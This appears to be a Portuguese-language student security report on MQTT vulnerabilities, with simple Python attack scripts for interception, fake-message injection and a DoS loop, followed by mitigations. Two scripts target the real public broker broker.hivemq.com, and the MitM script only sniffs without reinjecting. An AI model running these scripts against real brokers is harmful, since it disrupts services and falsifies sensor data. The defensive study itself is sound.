## Documentação de Análise de Vulnerabilidade e Segurança MQTT

### 1. Introdução

Esta documentação tem como objetivo apresentar uma análise detalhada das vulnerabilidades associadas ao protocolo MQTT, particularmente em relação aos pilares da Confiabilidade, Integridade e Disponibilidade. Serão abordadas técnicas de ataque simuladas e medidas de mitigação recomendadas.

- Em [Mídia](https://github.com/Gabi-Barretto/M9-Individual/tree/main/Ponderada%203/M%C3%ADdia) temos o vídeo do funcionamento do publisher e os ataques a suas vulnerabilidades. Tambem no disponível no Drive:

- [Confiabilidade](https://drive.google.com/file/d/1t6aCsvY1sFbP39xEDqoETfFn4rDralsl/view?usp=sharing).
- [Integridade](https://drive.google.com/file/d/1mW5aqrSG5b9f2u1d0OZsuiSPFgak4lkD/view?usp=sharing).
- [Disponibilidade](https://drive.google.com/file/d/1YILzq9VqLuwmt0B6gfNlv0n75vYaTr5O/view?usp=sharing).

### 2. Configuração do Ambiente

O ambiente consiste em um broker MQTT e um cliente MQTT configurado para publicar dados de sensores. O broker utilizado é `hivemq.cloud` com TLS/SSL desativado por padrão.

### 3. Análise de Vulnerabilidades

##### 3.1 Confiabilidade

A confiabilidade é comprometida pela ausência de criptografia na transmissão de dados, permitindo interceptações e alterações.

##### 3.2 Integridade

A integridade dos dados é vulnerável devido à falta de mecanismos de validação e autenticação dos dados enviados e recebidos.

##### 3.3 Disponibilidade

A disponibilidade pode ser afetada por ataques de DoS, que sobrecarregam o broker e impedem a comunicação normal.

### 4. Exemplos de Scripts de Invasão

#### 4.1 Ataque ao Pilar de Confiabilidade

```python
# Exemplo de um ataque Man-in-the-Middle (MitM) usando Scapy
from scapy.all import *

def mitm_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        print("Packet Intercepted: " + packet[Raw].load.decode())
        packet[Raw].load = packet[Raw].load.replace(b'original', b'modified')
    return packet

sniff(filter="tcp port 1883", prn=mitm_packet)
```

#### 4.2 Ataque ao Pilar de Integridade

```python
# Exemplo de injeção de mensagens falsas em um broker MQTT
import paho.mqtt.publish as publish

fake_data = '{"sensor": "temperatura", "valor": "100"}'
publish.single("casa/sala/temperatura", fake_data, hostname="broker.hivemq.com")
```

#### 4.3 Ataque ao Pilar de Disponibilidade

```python
# Exemplo de um ataque DoS simples ao broker MQTT
import socket

target_ip = "broker.hivemq.com"
target_port = 1883

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try:
        sock.connect((target_ip, target_port))
        print("Conexão estabelecida, enviando payload...")
        sock.send(b"A" * 1024)  # Envia um grande volume de dados
    except Exception as e:
        print(f"Erro: {e}")
```

### 5. Medidas de Mitigação

- **Para a Confiabilidade:** Habilitar TLS/SSL para a criptografia de dados.
- **Para a Integridade:** Implementar autenticação de clientes e validação de dados.
- **Para a Disponibilidade:** Configurar limites de taxa e monitoramento proativo para prevenir e mitigar ataques de DoS.

### 6. Conclusão

A análise e simulação de ataques demonstram a importância de adotar práticas robustas de segurança para proteger os sistemas que utilizam o protocolo MQTT contra vulnerabilidades comuns.

### 7. Referências

- MQTT.org. Documentação oficial do MQTT.


- OWASP. Top 10 IoT Vulnerabilities.
- Paho MQTT Python Client Library.
